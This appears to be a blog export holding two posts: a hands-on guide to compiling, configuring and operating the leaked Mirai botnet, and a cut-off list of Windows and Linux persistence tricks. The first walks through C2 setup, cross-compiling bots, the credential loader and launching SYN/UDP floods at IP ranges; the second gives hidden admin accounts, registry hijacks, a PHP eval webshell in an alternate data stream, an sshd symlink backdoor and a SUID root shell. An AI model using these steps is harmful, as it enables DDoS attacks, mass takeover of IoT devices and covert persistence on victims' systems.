<p>As a famous and well constructed IoT botnet, It is analysed by many security researchers like the <a class="link"   href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf" >paper<i class="fas fa-external-link-alt"></i></a> from Usenix, and the structure of <code>Mirai</code>:<br><img src="/imghost/bmbti/arch.png" alt="architecture"></p>
<p>The source code of <code>Mirai</code> has been released on <a class="link"   href="https://github.com/jgamblin/Mirai-Source-Code" >Github<i class="fas fa-external-link-alt"></i></a> by <a class="link"   href="https://hackforums.net/showthread.php?tid=5420472" >Anna-senpai<i class="fas fa-external-link-alt"></i></a>, which provides us a good tutorial for building our own botnet.<br>Here we follow the lead to compile and run it.</p>
<h2 id="Compile-Mirai-Source"><a href="#Compile-Mirai-Source" class="headerlink" title="Compile Mirai Source"></a>Compile Mirai Source</h2><p>The “official” installation guide has been given in a <a class="link"   href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/ForumPost.md" >ForumPost<i class="fas fa-external-link-alt"></i></a> of the <a href="https://hackforums.net/"><code>hackforum</code></a> (<a class="link"   href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/ForumPost.txt" >See original archived post<i class="fas fa-external-link-alt"></i></a>).</p>
<h3 id="Install-Requirements"><a href="#Install-Requirements" class="headerlink" title="Install Requirements"></a>Install Requirements</h3><p>Since it is written in <code>C</code> and <code>Go</code>, and the <code>CNC</code> server requires <code>Mysql</code> for storage, so we have to prepare:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install git gcc golang electric-fence mysql-server mysql-client</span><br></pre></td></tr></table></figure>
<p>Then remember to get the source code:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/jgamblin/Mirai-Source-Code </span><br><span class="line">$ <span class="built_in">cd</span> Mirai-Source-Code</span><br><span class="line">$ ls</span><br><span class="line">ForumPost.md  ForumPost.txt  LICENSE.md  README.md  dlr/  loader/  mirai/  scripts/</span><br></pre></td></tr></table></figure>
<p>The brief structure image:<img src="/imghost/bmbti/code.jpg" alt="code structure"></p>
<h3 id="Configure-Bot"><a href="#Configure-Bot" class="headerlink" title="Configure Bot"></a>Configure Bot</h3><p>There are some utils in <code>Mirai-Source-Code/mirai/tools/</code>, and here we use <code>enc.c</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mirai/tools &amp;&amp; gcc enc.c -o enc.out    <span class="comment"># compile it</span></span><br><span class="line">$ ./enc.out string cnc.server.com           <span class="comment"># encrypt cnc server domain/ip</span></span><br><span class="line">XOR<span class="string">&#x27;&#x27;</span>ing 15 bytes of data...</span><br><span class="line">\x41\x4C\x41\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22</span><br><span class="line">$ ./enc.out string report.server.com        <span class="comment"># encrypt report server domain/ip</span></span><br><span class="line">XOR<span class="string">&#x27;&#x27;</span>ing 18 bytes of data...</span><br><span class="line">\x50\x47\x52\x4D\x50\x56\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22</span><br></pre></td></tr></table></figure>
<p>Then change some strings in <code>Mirai-Source-Code/mirai/bot/table.c</code>, line 18 and line 21:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">16</span> <span class="function"><span class="keyword">void</span> <span class="title">table_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">17 </span>&#123;</span><br><span class="line"><span class="number">18</span>     <span class="built_in">add_entry</span>(TABLE_CNC_DOMAIN, <span class="string">&quot;\x41\x4C\x41\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22&quot;</span>, <span class="number">30</span>); <span class="comment">// cnc.server.com</span></span><br><span class="line"><span class="number">19</span>     <span class="built_in">add_entry</span>(TABLE_CNC_PORT, <span class="string">&quot;\x22\x35&quot;</span>, <span class="number">2</span>);   <span class="comment">// 23</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">21</span>     <span class="built_in">add_entry</span>(TABLE_SCAN_CB_DOMAIN, <span class="string">&quot;\x50\x47\x52\x4D\x50\x56\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22&quot;</span>, <span class="number">29</span>); <span class="comment">// report.server.com</span></span><br><span class="line"><span class="number">22</span>     <span class="built_in">add_entry</span>(TABLE_SCAN_CB_PORT, <span class="string">&quot;\x99\xC7&quot;</span>, <span class="number">2</span>);         <span class="comment">// 48101</span></span><br><span class="line"><span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>Here you can also see the ports are editable.</p>
<p>Because we usually compile it in <code>debug</code> mode, so we better comment out line 158 and line 162 to let <code>debug</code> mode really scan.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">158</span> <span class="comment">//#ifndef DEBUG</span></span><br><span class="line"><span class="number">159</span> <span class="meta">#<span class="meta-keyword">ifdef</span> MIRAI_TELNET</span></span><br><span class="line"><span class="number">160</span>     <span class="built_in">scanner_init</span>();</span><br><span class="line"><span class="number">161</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">162</span> <span class="comment">//#endif</span></span><br></pre></td></tr></table></figure>

<h3 id="Configure-CNC"><a href="#Configure-CNC" class="headerlink" title="Configure CNC"></a>Configure CNC</h3><p>The <code>CNC</code> server needs a database. The script <code>Mirai-Source-Code/scripts/db.sql</code> should be edited first, add <code>use mirai;</code> in line 2:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE mirai;</span><br><span class="line">use mirai;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `history` (</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>Then start <code>Mysql</code> service and update <code>Mysql</code> database with this script (I set <code>root:root</code> for my db):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ service mysql start</span><br><span class="line">$ cat Mirai-Source-Code/scripts/db.sql | mysql -uroot -proot</span><br></pre></td></tr></table></figure>
<p>Add a user to <code>Mysql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>uroot <span class="operator">-</span>proot mirai</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span> (<span class="keyword">NULL</span>, <span class="string">&#x27;mirai-user&#x27;</span>, <span class="string">&#x27;mirai-pass&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">30</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>Attention: here if you install mysql for the first time, you may encounter… I will put forward my solutions later.</p>
<p>Then go to <code>Mirai-Source-Code/mirai/cnc/main.go</code> and edit line 10 to line 14:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> DatabaseAddr <span class="keyword">string</span>   = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> DatabaseUser <span class="keyword">string</span>   = <span class="string">&quot;root&quot;</span></span><br><span class="line"><span class="keyword">const</span> DatabasePass <span class="keyword">string</span>   = <span class="string">&quot;root&quot;</span></span><br><span class="line"><span class="keyword">const</span> DatabaseTable <span class="keyword">string</span>  = <span class="string">&quot;mirai&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Cross-Compile"><a href="#Cross-Compile" class="headerlink" title="Cross Compile"></a>Cross Compile</h3><p>Create a folder at <code>Mirai</code> root path, and download cross-compilers:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir cross-compile-bin &amp;&amp; <span class="built_in">cd</span> cross-compile-bin</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2</span><br></pre></td></tr></table></figure>
<p>Then run script and add some environment variables to <code>~/.bashrc</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo Mirai-Source-Code/script/cross-compile.sh</span><br><span class="line">Install mysql-server and mysql-client (y/n)? ...</span><br><span class="line">$ vi ~/.bashrc</span><br><span class="line">...</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv4l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv5l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv6l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/i586/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/m68k/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/mips/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/mipsel/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/powerpc/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/powerpc-440fp/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/sh4/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/sparc/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOPATH=<span class="variable">$HOME</span>/go</span><br></pre></td></tr></table></figure>
<p>Refresh:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir ~/go</span><br><span class="line">$ <span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>Get <code>Golang</code> requirements:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ go get github.com/go-sql-driver/mysql</span><br><span class="line">$ go get github.com/mattn/go-shellwords</span><br></pre></td></tr></table></figure>
<p>Compile <code>Bot</code> and <code>CNC</code> and <code>loader</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># compile `bot` and `cnc`</span></span><br><span class="line">$ Mirai-Source-Code/mirai/build.sh debug telnet   <span class="comment"># Usage: ./build.sh &lt;debug | release&gt; &lt;telnet | ssh&gt;</span></span><br><span class="line"><span class="comment"># compile loader</span></span><br><span class="line">$ Mirai-Source-Code/loader/build.sh</span><br></pre></td></tr></table></figure>
<p>Now the <code>BOT</code> (<code>mirai.$ARCH</code>) and <code>CNC</code> binaries, and some other tools are all under <code>mirai/debug/</code> (or <code>mirai/release/</code>) folder.<br>The <code>loader</code> binary is under <code>loader/</code>.</p>
<h2 id="Attack-with-Mirai"><a href="#Attack-with-Mirai" class="headerlink" title="Attack with Mirai"></a>Attack with Mirai</h2><h3 id="CNC-Server"><a href="#CNC-Server" class="headerlink" title="CNC Server"></a>CNC Server</h3><p>First start <code>CNC</code> server. Attention that in <code>Mirai-Source-Code/mirai/cnc/admin.go</code> line 20:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    headerb, err := ioutil.ReadFile(<span class="string">&quot;prompt.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>The <code>prompt.txt</code> gets a relative path, so we have to run <code>cnc</code> with <code>prompt.txt</code> existing in our current directory. Or just comment out it. Then you can run it:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> Mirai-Source-Code/mirai/     <span class="comment"># make sure `prompt.txt` in the same dir</span></span><br><span class="line">$ ./debug/cnc</span><br><span class="line">Mysql DB opened</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Then you can connect it with <code>telnet</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ telnet cnc.server.com 23</span><br><span class="line"></span><br><span class="line">я люблю куриные наггетсы</span><br><span class="line">пользователь: mirai-user</span><br><span class="line">пароль: **********</span><br><span class="line"></span><br><span class="line">проверив счета... |</span><br><span class="line">[+] DDOS | Succesfully hijacked connection</span><br><span class="line">[+] DDOS | Masking connection from utmp+wtmp...</span><br><span class="line">[+] DDOS | Hiding from netstat...</span><br><span class="line">[+] DDOS | Removing all traces of LD_PRELOAD...</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.1</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.2</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.3</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.4</span><br><span class="line">[+] DDOS | Setting up virtual terminal...</span><br><span class="line">[!] Sharing access IS prohibited!</span><br><span class="line">[!] Do NOT share your credentials!</span><br><span class="line">Ready</span><br><span class="line">mirai-user@botnet# </span><br><span class="line">mirai-user@botnet# ?</span><br><span class="line">Available attack list</span><br><span class="line">udp: UDP flood</span><br><span class="line">dns: DNS resolver flood using the targets domain, input IP is ignored</span><br><span class="line">ack: ACK flood</span><br><span class="line">greip: GRE IP flood</span><br><span class="line">udpplain: UDP flood with less options. optimized for higher PPS</span><br><span class="line">http: HTTP flood</span><br><span class="line">vse: Valve source engine specific flood</span><br><span class="line">syn: SYN flood</span><br><span class="line">stomp: TCP stomp flood</span><br><span class="line">greeth: GRE Ethernet flood</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>You can <code>adduser</code> to add and arrange <code>bot</code> for it, use <code>botcount</code> to see <code>bot</code> number.<br>Here <code>?</code> can be understood as a placeholder to explain the meaning of the current position parameter:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mirai-user@botnet# udp ?</span><br><span class="line">Comma delimited list of target prefixes</span><br><span class="line">Ex: 192.168.0.1</span><br><span class="line">Ex: 10.0.0.0/8</span><br><span class="line">Ex: 8.8.8.8,127.0.0.0/29</span><br><span class="line"></span><br><span class="line">mirai-user@botnet# udp 8.8.8.8 ?</span><br><span class="line">Duration of the attack, in seconds</span><br><span class="line"></span><br><span class="line">mirai-user@botnet# udp 8.8.8.8 10 ?</span><br><span class="line">List of flags key=val seperated by spaces. Valid flags for this method are</span><br><span class="line"></span><br><span class="line">tos: TOS field value in IP header, default is 0</span><br><span class="line">ident: ID field value in IP header, default is random</span><br><span class="line">ttl: TTL field in IP header, default is 255</span><br><span class="line">len: Size of packet data, default is 512 bytes</span><br><span class="line">rand: Randomize packet data content, default is 1 (yes)</span><br><span class="line">df: Set the Dont-Fragment bit in IP header, default is 0 (no)</span><br><span class="line">sport: Source port, default is random</span><br><span class="line">dport: Destination port, default is random</span><br><span class="line">source: Source IP address, 255.255.255.255 for random</span><br><span class="line"></span><br><span class="line">Value of 65535 for a flag denotes random (for ports, etc)</span><br><span class="line">Ex: seq=0</span><br><span class="line">Ex: sport=0 dport=65535</span><br></pre></td></tr></table></figure>
<h3 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h3><p>The very first step for attacking, is to run <code>loader</code>. The <code>loader</code> reads <code>telnet</code> entries from STDIN in following format:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip:port user:pass</span><br></pre></td></tr></table></figure>
<p>You can prepare a formatted file and run like this:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat file.txt | Mirai-Source-Code/loader/loader</span><br><span class="line">0s	Processed: 0	Conns: 0	Logins: 0	Ran: 0	Echoes:0 Wgets: 0, TFTPs: 0</span><br><span class="line">Hit end of input.</span><br></pre></td></tr></table></figure>
<h3 id="Mirai-Bot"><a href="#Mirai-Bot" class="headerlink" title="Mirai Bot"></a>Mirai Bot</h3><p>As for victims, they execute <code>mirai</code> binary to connect back to <code>CNC</code> server and continue to scan (brute forcing) hosts with weak <code>telnet</code> password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./mirai.dbg</span><br><span class="line">DEBUG MODE YO</span><br><span class="line">[main] We are the only process on this system!</span><br><span class="line">listening tun0</span><br><span class="line">[main] Attempting[ to kicollennr] eTrcyint g tto ko illCN pCort</span><br><span class="line"> 23</span><br><span class="line">[killer] Finding and killing processes holding port 23</span><br><span class="line">Failed to find inode for port 23</span><br><span class="line">[killer] Failed to kill port 23</span><br><span class="line">[killer] Bound to tcp/23 (telnet)</span><br><span class="line">[resolv] Got response from select</span><br><span class="line">[resolv] Found IP address: f3251c73</span><br><span class="line">Resolved cnc.server.com to 1 IPv4 addresses</span><br><span class="line">[main] Resolved domain</span><br><span class="line">[main] Connected to CNC. Local address = -335435584</span><br><span class="line">[killer] Detected we are running out of `/path/to/Mirai-Source-Code/mirai/debug/mirai.dbg`</span><br><span class="line">[killer] Memory scanning processes</span><br><span class="line">[table] Tried to access table.11 but it is locked</span><br><span class="line">Got SIGSEGV at address: 0x0</span><br></pre></td></tr></table></figure>
<p>Sometimes encounter <code>[main] Failed to resolve CNC address</code>, it might because in <code>Mirai-Source-Code/mirai/bot/table.c</code> the resolving domain is hardcoded in line 84, you can change it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);</span><br></pre></td></tr></table></figure>
<p>When it receives commands from <code>CNC</code> it will follow the lead:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[main] Connected to CNC. Local address = -335435584</span><br><span class="line">[main] Received 14 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 18 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 18 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 19 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br></pre></td></tr></table></figure>
<p>Attacking history is stored in <code>Mysql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> history;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> user_id <span class="operator">|</span> time_sent  <span class="operator">|</span> duration <span class="operator">|</span> command           <span class="operator">|</span> max_bots <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span> <span class="number">1478583439</span> <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> syn <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="number">24</span> <span class="number">1</span> <span class="operator">|</span>       <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span> <span class="number">1478583522</span> <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> syn <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span><span class="operator">/</span><span class="number">26</span> <span class="number">1</span>  <span class="operator">|</span>       <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span> <span class="number">1478583560</span> <span class="operator">|</span>       <span class="number">10</span> <span class="operator">|</span> syn <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span><span class="operator">/</span><span class="number">26</span> <span class="number">10</span> <span class="operator">|</span>       <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span> <span class="number">1478584054</span> <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> udp <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span><span class="operator">/</span><span class="number">28</span> <span class="number">1</span>  <span class="operator">|</span>       <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>In source code it scan totally randomly, we can control the range by editing <code>Mirai-Source-Code/mirai/bot/scanner.c</code> starting from line 674.</p>
<h3 id="scanListen"><a href="#scanListen" class="headerlink" title="scanListen"></a>scanListen</h3><p>It is a <code>user:pass</code> receiver, run it by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo Mirai-Source-Code/mirai/debug/scanListen</span><br><span class="line"></span><br><span class="line">xxx.xxx.xxx.xxx:xx  username:password</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>arm</tag>
        <tag>mips</tag>
        <tag>botnet</tag>
      </tags>
  </entry>
  <entry>
    <title>About Pentest Persistence</title>
    <url>/2021/02/18/2021-02-18-About-Pentest-Persistence/</url>
    <content><![CDATA[<p>Persistence is to maintain your privilege after breaking into a  system.</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>You can learn <a class="link"   href="https://pentestlab.blog/methodologies/red-teaming/persistence/" >persistence methodologies<i class="fas fa-external-link-alt"></i></a>&#x2F;<a class="link"   href="https://pentestlab.blog/category/red-team/persistence/" >category of persistence<i class="fas fa-external-link-alt"></i></a> (and other red teaming skills) with <a class="link"   href="https://pentestlab.blog/" >penetration testing lab<i class="fas fa-external-link-alt"></i></a>. </p>
<p>Addition:</p>
<ol>
<li>Schedule task:</li>
</ol>
<ul>
<li>GUI tool: <code>taskschd.msc</code></li>
<li>CMD tool: <code>schtasks.exe</code></li>
<li><a class="link"   href="https://github.com/AV1080p/Schtasks-Backdoor" >Schtasks-Backdoor<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ol start="2">
<li>Shadow account: having admin privs but not showing</li>
</ol>
<ul>
<li><code>net user admin$ Test1 /add</code></li>
<li><code>net localgroup administrators admin$ /add</code></li>
<li>backup <code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users</code> </li>
<li><code>net user admin$ /del</code></li>
<li>only recovery registry k-v pairs</li>
</ul>
<ol start="3">
<li><p>Edit registry to change startups.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
</li>
<li><p><a class="link"   href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/xperf/image-file-execution-options" >Image File Execution Options<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ol>
<ul>
<li>find<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options</code></li>
<li>add <code>debugger</code> to it like:</li>
<li><code>reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;c:\windows\system32\calc.exe&quot;</code></li>
<li>open <code>notpad.exe</code>, you get <code>calc.exe</code> started</li>
<li>to keep it silent, need <code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/SilentProcessExit</code></li>
<li>configure (need admin privs)<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d <span class="number">512</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d <span class="number">1</span></span><br><span class="line">reg add <span class="string">&quot;KLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="string">&quot;c:\windows\system32\taskmgr.exe&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li>Shift backdoor</li>
<li>…</li>
</ol>
<h3 id="Hide-tech"><a href="#Hide-tech" class="headerlink" title="Hide tech"></a>Hide tech</h3><ol>
<li>Hide file</li>
</ol>
<ul>
<li>Use <code>attrib +s +a +h +r D:\test\project\test.txt</code> to add system, archived, hidden, read-only attributes.</li>
<li>Use ADS(alternate data stream): <code>echo ^&lt;?php @eval($_POST[&#39;chopper&#39;]);?^&gt; &gt; index.php:hidden.jpg</code>, <code>notepad index.php:hidden.jpg</code> to check content.</li>
<li>Driver-class hidden: <a class="link"   href="http://www.xoslab.com/efl.html" >Easy File Locker<i class="fas fa-external-link-alt"></i></a><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if cannot find file but in system dir exists:</span></span><br><span class="line">c:\WINDOWS\xlkfs.dat</span><br><span class="line">c:\WINDOWS\xlkfs.dll</span><br><span class="line">c:\WINDOWS\xlkfs.ini</span><br><span class="line">c:\WINDOWS\system32\drivers\xlkfs.sys</span><br><span class="line"><span class="comment"># to clean it </span></span><br><span class="line">&gt; <span class="built_in">sc</span> qc xlkfs</span><br><span class="line">&gt; net stop xlkfs</span><br><span class="line">&gt; <span class="built_in">sc</span> delete xlkfs</span><br><span class="line"><span class="comment"># then delete those files in system dir and restart</span></span><br></pre></td></tr></table></figure></li>
<li>There’re many other ways but fileless attack becomes popular</li>
</ul>
<ol start="2">
<li>Hide account</li>
</ol>
<ul>
<li>Creating shadow account</li>
</ul>
<ol start="3">
<li>Port reuse</li>
</ol>
<ul>
<li>victim: <code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></li>
<li>attacker: winrs -r:<a class="link"   href="http://x.x.x.x/" >http://x.x.x.x<i class="fas fa-external-link-alt"></i></a> -u:administrator -p:passwd whoami</li>
<li>will leave footprint in log</li>
</ul>
<ol start="4">
<li>Hide service</li>
</ol>
<ul>
<li>using <code>SDDL</code>(Security Descriptor Definition Language, able to change object <code>DACL</code>): <code>sc.exe sdset test &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></li>
<li>delete <code>SDDL</code> statement to recover: <code>&amp; $env:SystemRoot\System32\sc.exe sdset auto_calc &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</code></li>
</ul>
<ol start="5">
<li>…</li>
</ol>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Backdoors"><a href="#Backdoors" class="headerlink" title="Backdoors"></a>Backdoors</h3><ol>
<li>Timed task:</li>
</ol>
<ul>
<li>for one time: <code>at</code></li>
<li>run periodically: <code>crontab</code>(<code>crond</code> process)</li>
<li><code>anacron</code></li>
</ul>
<ol start="2">
<li><code>sshd</code> soft link</li>
</ol>
<ul>
<li>victim: <code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</code></li>
<li>attacker: <code>ssh root@x.x.x.x -p 5555</code> with any password</li>
</ul>
<ol start="3">
<li>SUID shell</li>
</ol>
<ul>
<li>as root: <code>cp /bin/bash /dev/.rootshell</code></li>
<li>and run: <code>chmod u+s /dev/.rootshell</code></li>
<li>normal user can execute <code>/dev/.rootshell</code></li>
</ul>
<ol start="4">
